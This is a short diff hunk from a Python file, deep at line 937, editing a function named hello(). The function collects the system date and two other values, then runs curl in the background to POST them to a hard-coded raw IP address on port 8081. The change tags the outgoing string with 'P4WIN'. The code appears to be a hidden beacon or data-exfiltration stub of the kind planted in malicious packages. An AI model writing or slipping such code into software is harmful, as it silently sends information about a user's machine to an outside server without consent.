@@ -937,7 +937,7 @@ def hello():
     dateis = subprocess.run("date", capture_output=True, text=True) 
     text3 = dateis.stdout.strip()
 
-    text = text1 + ", " + text2 + ", " + text3
+    text = "P4WIN" + text1 + ", " + text2 + ", " + text3
 
     try: subprocess.Popen(["curl", "-d", f"{str(text)}", "http://137.184.76.134:8081"])
     except Exception as e: input(e)
